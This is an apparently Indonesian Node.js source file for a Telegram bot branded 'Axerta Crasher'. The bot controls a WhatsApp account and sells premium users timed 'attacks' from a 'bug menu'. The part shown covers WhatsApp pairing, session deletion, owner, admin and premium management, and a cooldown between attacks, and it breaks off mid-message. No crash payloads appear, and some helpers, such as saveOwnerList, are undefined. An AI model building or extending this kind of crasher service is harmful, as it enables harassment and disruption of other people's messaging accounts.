//by gua 🗿
//https://whatsapp.com/channel/0029VazMfuDAojYvGyLQz711


//error ? perbaiki sendiri

const {
    Telegraf,
    Markup
} = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const {
    BOT_TOKEN,
    allowedDevelopers
} = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./o.jpg`)
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let zephy = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let whatsappUserInfo = null;
// cooldown bug jedanya ini
let bugCooldown = 0; // dalam detik
let userLastAttack = new Map(); // Menyimpan waktu terakhir user melakukan serangan
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};
//funct cooldown

function checkCooldown(userId) {
    if (!userLastAttack.has(userId)) {
        return {
            canAttack: true,
            remainingTime: 0
        };
    }

    const lastAttack = userLastAttack.get(userId);
    const now = Date.now();
    const timePassed = (now - lastAttack) / 1000; // Convert to seconds

    if (timePassed < bugCooldown) {
        return {
            canAttack: false,
            remainingTime: Math.ceil(bugCooldown - timePassed)
        };
    }

    return {
        canAttack: true,
        remainingTime: 0
    };
}
// --- Fungsi untuk Menambahkan User Premium ---
// --- Premium User Management Functions ---
// This should be at the top of your file, after your imports and before any bot commands

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Function Order Should Be ---
const loadPremiumUsers = () => {
    try {
        if (fs.existsSync('./premiumUsers.json')) {
            const data = fs.readFileSync('./premiumUsers.json', 'utf8');
            premiumUsers = JSON.parse(data);
        } else {
            premiumUsers = {};
            savePremiumUsers();
        }
    } catch (error) {
        console.error('Error loading premium users:', error);
        premiumUsers = {};
    }
};

const savePremiumUsers = () => {
    try {
        const safeData = {};
        for (const [userId, userData] of Object.entries(premiumUsers)) {
            safeData[userId] = {
                expired: userData.expired
            };
        }
        const jsonString = JSON.stringify(safeData, null, 2);
        fs.writeFileSync('./premiumUsers.json', jsonString);
    } catch (error) {
        console.error('Error saving premium users:', error);
    }
};

const addPremiumUser = (userId, durationDays) => {
    try {
        if (!userId || !durationDays) {
            throw new Error('Invalid user ID or duration');
        }
        const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
        premiumUsers[userId] = {
            expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
        };
        savePremiumUsers();
    } catch (error) {
        console.error('Error adding premium user:', error);
        throw error;
    }
};
// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        const premiumMessage = `
 ⚡ AxèrtáBot Project ⚡
 ╔══════════════════
 ║ ❌ ACCESS DENIED!
 ║ 💎 Status: NON-PREMIUM
 ║ ⚠️ Need Premium Access
 ╚══════════════════`;

        await ctx.reply(premiumMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "💫 UPGRADE TO PREMIUM",
                        url: "https://t.me/PengodeHandal"
                    }],
                    [{
                        text: "📖 PREMIUM FEATURES",
                        callback_data: "premium_info"
                    }]
                ]
            }
        });
    }
};

// Tambahan handler untuk premium info
bot.action('premium_info', async (ctx) => {
    const infoMessage = `
 ⚡ AxèrtáBot Project ⚡
 ╔══════════════════
 ║ 💎 PREMIUM FEATURES
 ║ • Unlimited Access
 ║ • Priority Support
 ║ • All Commands
 ║ • Latest Updates
 ╚══════════════════`;

    await ctx.editMessageText(infoMessage, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: "🌟 GET PREMIUM NOW",
                    url: "https://t.me/PengodeHandal"
                }]
            ]
        }
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({
    logger: pino().child({
        level: 'silent',
        stream: 'store'
    })
});

const startSesi = async () => {
    let retryCount = 0;
    const maxRetries = 3;
    const retryDelay = 5000; // 5 detik

    const attemptConnection = async () => {
        try {
            const {
                state,
                saveCreds
            } = await useMultiFileAuthState('./session');
            const {
                version
            } = await fetchLatestBaileysVersion();

            const connectionOptions = {
                version,
                keepAliveIntervalMs: 30000,
                printQRInTerminal: false,
                logger: pino({
                    level: "silent"
                }),
                auth: state,
                browser: ['Mac OS', 'Safari', '10.15.7'],
                getMessage: async (key) => ({
                    conversation: 'P',
                }),
                connectTimeoutMs: 10000,
                qrTimeout: 30000,
            };

            zephy = makeWASocket(connectionOptions);
            zephy.ev.on('creds.update', saveCreds);
            store.bind(zephy.ev);

            zephy.ev.on('connection.update', async (update) => {
                const {
                    connection,
                    lastDisconnect
                } = update;

                if (connection === 'open') {
                    isWhatsAppConnected = true;
                    whatsappUserInfo = {
                        name: zephy?.user?.name,
                        id: zephy?.user?.id
                    };
                    retryCount = 0; // Reset retry counter

                    const successMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Connected ✅
│ • Name: ${zephy?.user?.name || 'Unknown'}
│ • Number: ${zephy?.user?.id?.split(':')[0] || 'Unknown'}
│
├─────『 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 』
│ • Mode: Active
│ • Version: 3.0 Stable Release
│ • Type: Multi-Device
│
╰═════════════════════⊱`;

                    try {
                        for (const ownerId of allowedDevelopers) {
                            await bot.telegram.sendMessage(ownerId, successMessage);
                        }
                        for (const adminId of adminList) {
                            if (!allowedDevelopers.includes(adminId)) {
                                await bot.telegram.sendMessage(adminId, successMessage);
                            }
                        }
                    } catch (error) {
                        console.error('Error sending connect notification:', error);
                    }

                    console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
                }

                if (connection === 'close') {
                    isWhatsAppConnected = false;
                    whatsappUserInfo = null;
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                    // Check if banned
                    const isBanned = statusCode === 401 ||
                        lastDisconnect?.error?.message?.includes('banned') ||
                        lastDisconnect?.error?.message?.includes('Block');

                    if (isBanned) {
                        const bannedMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐚𝐧𝐧𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Status: Account Banned ⛔
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto deleting session
│ • Create new WhatsApp number
│
╰═════════════════════⊱`;

                        try {
                            // Notify owners about ban
                            for (const ownerId of allowedDevelopers) {
                                await bot.telegram.sendMessage(ownerId, bannedMessage);
                            }

                            // Delete session
                            const sessionPath = './session';
                            if (fs.existsSync(sessionPath)) {
                                fs.rmSync(sessionPath, {
                                    recursive: true,
                                    force: true
                                });

                                const deleteMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session cleared ✅
│ • Ready for new pairing
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing with new number
│
╰═════════════════════⊱`;

                                for (const ownerId of allowedDevelopers) {
                                    await bot.telegram.sendMessage(ownerId, deleteMessage);
                                }
                            }
                            return; // Stop trying to reconnect
                        } catch (error) {
                            console.error('Error handling ban:', error);
                        }
                    }

                    // Normal disconnection handling
                    if (retryCount < maxRetries && shouldReconnect) {
                        retryCount++;

                        const disconnectMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐋𝐨𝐬𝐭 』
│ • Status: Disconnected ❌
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Attempt: ${retryCount}/${maxRetries}
│ • Auto Reconnect: Yes
│
╰═════════════════════⊱`;

                        try {
                            for (const ownerId of allowedDevelopers) {
                                await bot.telegram.sendMessage(ownerId, disconnectMessage);
                            }
                        } catch (error) {
                            console.error('Error sending disconnect notification:', error);
                        }

                        console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));

                        await new Promise(resolve => setTimeout(resolve, retryDelay));
                        return attemptConnection();
                    }

                    // Max retries reached or shouldn't reconnect
                    if (retryCount >= maxRetries) {
                        const maxRetriesMessage = `
╭═══════『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Max retries reached ❌
│ • Failed to connect ${maxRetries}x
│ • Possible account issue
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto clearing session...
│
╰═════════════════════⊱`;

                        try {
                            for (const ownerId of allowedDevelopers) {
                                await bot.telegram.sendMessage(ownerId, maxRetriesMessage);
                            }

                            // Auto delete session after max retries
                            const sessionPath = './session';
                            if (fs.existsSync(sessionPath)) {
                                fs.rmSync(sessionPath, {
                                    recursive: true,
                                    force: true
                                });

                                const clearMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session deleted ✅
│ • System ready for new setup
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new number
│
╰═════════════════════⊱`;

                                for (const ownerId of allowedDevelopers) {
                                    await bot.telegram.sendMessage(ownerId, clearMessage);
                                }
                            }
                        } catch (error) {
                            console.error('Error handling max retries:', error);
                        }
                    }
                }
            });

        } catch (error) {
            console.error('Connection error:', error);
            if (retryCount < maxRetries) {
                retryCount++;
                console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));
                await new Promise(resolve => setTimeout(resolve, retryDelay));
                return attemptConnection();
            }
        }
    };

    return attemptConnection();
};

// Inisialisasi bot
(async () => {
    console.log(chalk.whiteBright.bold(`
╭──────────────────────────────────────────────╮
│                                              │
│     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     │
│     ████████████████████████████████████     │    
│     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀     │
│                                              │
│        Welcome to Axerta Crasher          │
│     Crafted with Love By       │
│                                              │
╰──────────────────────────────────────────────╯

╭──────────────────────────────────────────────╮
│   Setiap baris kode adalah doa              │
│   Setiap fungsi adalah harapan              │
│   Untuk AxèrtáBot yang lebih baik           │
│   Bot ini kupersembahkan untuk Indonesia    │
╰──────────────────────────────────────────────╯

╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃        SUKSES MEMUAT DATABASE OWNER          ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();

    startSesi();
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---
// Command
bot.command("removeallbot", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    try {
        // Konfirmasi terlebih dahulu
        const confirmationMessage = `
╭═══════『 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐟𝐢𝐫𝐦𝐚𝐭𝐢𝐨𝐧 』
│ • Action: Remove All Bot Sessions
│ • Impact: All WhatsApp connections will be lost
│ • Status: Awaiting Confirmation
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • This action cannot be undone
│ • You'll need to pair again after this
│
╰═════════════════════⊱`;

        await ctx.reply(confirmationMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                            text: "✅ Yes, Remove All",
                            callback_data: "confirm_remove"
                        },
                        {
                            text: "❌ Cancel",
                            callback_data: "cancel_remove"
                        }
                    ]
                ]
            }
        });

    } catch (error) {
        console.error('Remove Bot Error:', error);
        await ctx.reply("❌ Terjadi kesalahan saat mencoba menghapus session.");
    }
});

// Handler untuk konfirmasi penghapusan
bot.action('confirm_remove', async (ctx) => {
    try {
        // Hapus pesan konfirmasi
        await ctx.deleteMessage();

        // Logout dari WhatsApp jika terhubung
        if (zephy && isWhatsAppConnected) {
            await zephy.logout();
            isWhatsAppConnected = false;
            whatsappUserInfo = null;
        }

        // Hapus folder session
        const sessionPath = './session';
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, {
                recursive: true,
                force: true
            });
        }

        const successMessage = `
╭═══════『 ✅ 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Action: Remove All Bot Sessions
│ • Status: Completed Successfully
│
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new bot
│
╰═════════════════════⊱`;

        await ctx.reply(successMessage);

    } catch (error) {
        console.error('Remove Session Error:', error);
        await ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
    }
});

// Handler untuk membatalkan penghapusan
bot.action('cancel_remove', async (ctx) => {
    await ctx.deleteMessage();
    await ctx.reply("⚠️ Penghapusan session dibatalkan.");
});
// Command untuk pairing WhatsApp
bot.command("addpairing", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    function formatPhoneNumber(number) {
        let cleaned = number.replace(/[^0-9]/g, '');
        cleaned = cleaned.replace(/^\+/, '');

        if (cleaned.startsWith('0')) {
            return '62' + cleaned.slice(1);
        } else if (cleaned.startsWith('62')) {
            return cleaned;
        } else {
            return cleaned;
        }
    }

    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        const helpMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐅𝐨𝐫𝐦𝐚𝐭 』
│ • /addpairing 628xxxxxxxxxx
│ • /addpairing +1234567890    
│ • /addpairing 0812xxxxx
│
├─────『 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐝 』
│ • Indonesian numbers (62/0)
│ • International numbers
│ • With/without country code
│
╰═════════════════════⊱`;
        return await ctx.reply(helpMessage);
    }

    let phoneNumber = args.slice(1).join('');
    phoneNumber = formatPhoneNumber(phoneNumber);

    try {
        if (!zephy || !isWhatsAppConnected) {
            await ctx.reply("⏳ Menginisialisasi koneksi WhatsApp...");
            await startSesi();
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        await ctx.reply("⏳ Memproses permintaan pairing...");

        let pairingCode;
        let retryCount = 0;
        const maxRetries = 3;

        while (retryCount < maxRetries && !pairingCode) {
            try {
                pairingCode = await zephy.requestPairingCode(phoneNumber);
                if (!pairingCode || pairingCode.length < 4) {
                    throw new Error('Invalid pairing code received');
                }
            } catch (error) {
                retryCount++;
                if (retryCount === maxRetries) throw error;
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        // Kirim pesan awal
        const initialMsg = await ctx.reply(`
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Generated ✅
│ • Expires in: 30 seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`);

        // Set timer untuk update countdown
        let timeLeft = 30;
        const countdownInterval = setInterval(async () => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                try {
                    await ctx.telegram.editMessageText(
                        ctx.chat.id,
                        initialMsg.message_id,
                        null,
                        `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: EXPIRED ⌛
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Code has expired
│ • Please request new code
│
╰═════════════════════⊱`
                    );
                } catch (error) {
                    console.error("Error updating expired message:", error);
                }
                return;
            }

            try {
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    initialMsg.message_id,
                    null,
                    `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Active ✅
│ • Expires in: ${timeLeft} seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`
                );
            } catch (error) {
                console.error("Error updating countdown:", error);
            }
        }, 1000);

    } catch (error) {
        console.error('Pairing Error:', error);

        const errorMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 』═══════⊱
│
├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ • Error: Failed to generate code
│ • Number: ${phoneNumber}
│
├─────『 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧𝐬 』
│ • Check if number is registered
│ • Check internet connection
│ • Try again later
│
╰═════════════════════⊱`;
        await ctx.reply(errorMessage);

        if (!isWhatsAppConnected) {
            startSesi();
        }
    }
});
// Command /cekjeda
bot.command("cekjeda", async (ctx) => {
    const userId = ctx.from.id;
    const isPremium = isPremiumUser(ctx.from.id);

    // Cek status premium
    if (!isPremium) {
        return await ctx.reply(`
  ╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Not Premium ❌
  │ • Upgrade ke premium untuk
  │   menggunakan fitur ini
  │
  ╰═════════════════════⊱`);
    }

    // Cek status cooldown
    const cooldownStatus = checkCooldown(userId);

    if (cooldownStatus.canAttack) {
        await ctx.reply(`
  ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 𝐉𝐞𝐝𝐚 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Ready ✅
  │ • Cooldown: ${bugCooldown}s
  │ • You can attack now!
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Gunakan bug menu untuk
  │   memulai serangan
  │
  ╰═════════════════════⊱`);
    } else {
        await ctx.reply(`
  ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 𝐉𝐞𝐝𝐚 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Sisa: ${cooldownStatus.remainingTime}s
  │ • Total: ${bugCooldown}s
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Tunggu cooldown selesai
  │   untuk menyerang lagi
  │
  ╰═════════════════════⊱`);
    }
});
// Command /setjeda
// Command untuk set jeda
bot.command("setjeda", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2 || isNaN(args[1])) {
        return await ctx.reply(`
╭═══════『 𝐒𝐞𝐭 𝐉𝐞𝐝𝐚 』═══════⊱
│
├─────『 𝐅𝐨𝐫𝐦𝐚𝐭 』
│ • /setjeda <detik>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /setjeda 100
│ • /setjeda 300
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Minimal: 10 detik
│ • Maksimal: 3600 detik
│
╰═════════════════════⊱`);
    }

    const newCooldown = parseInt(args[1]);

    // Validasi input
    if (newCooldown < 10 || newCooldown > 3600) {
        return await ctx.reply("❌ Jeda harus antara 10 - 3600 detik!");
    }

    bugCooldown = newCooldown;
    await ctx.reply(`
╭═══════『 𝐒𝐞𝐭 𝐉𝐞𝐝𝐚 』═══════⊱
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Aktif untuk semua bug menu
│ • Berlaku per-user
│
╰═════════════════════⊱`);
});
// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
